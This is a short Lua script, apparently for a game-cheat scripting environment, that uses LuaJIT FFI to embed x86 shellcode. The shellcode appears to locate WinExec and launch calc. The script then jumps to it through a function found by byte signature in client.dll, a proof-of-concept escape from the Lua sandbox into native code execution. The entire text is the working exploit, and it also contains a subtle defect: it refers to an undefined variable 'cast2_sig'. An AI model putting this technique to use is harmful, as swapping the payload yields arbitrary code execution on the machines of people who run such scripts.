local ffi = require("ffi")
local shellcode = "\x31\xD2\x52\x68\x63\x61\x6C\x63\x54\x59\x52\x51\x64\x8B\x72\x30\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x54\x1F\x24\x0F\xB7\x2C\x17\x42\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF0\x8B\x74\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7"
local shellcode_cstr = ffi.new("char[?]", #shellcode + 1, shellcode)
local buffer = ffi.new("unsigned int[7][1]")
buffer[0][6] = ffi.cast("uintptr_t", shellcode_cstr)

local cast_sig = client.find_signature("client.dll", "\xC7\x45\xCC\xCC\xCC\xCC\xCC\x8B\xC4\xC7\x45\xF0\x00\x00\x00\x00\xC7\x45\xF4\x00\x00\x00\x00\xC7\x45\xF8\x00\x00\x00\x00\x0F\x10\x45\xEC\x0F\x11\x00\xE8\xCC\xCC\xCC\xCC\x8B\x0D\xCC\xCC\xCC\xCC") or error("Failed to find cast signature!")
local cast = ffi.cast("int(__thiscall*)(void*)", ffi.cast("void**", ffi.cast("uintptr_t", cast2_sig) + 3)[0]) or error("Failed to cast cast!")

cast(buffer)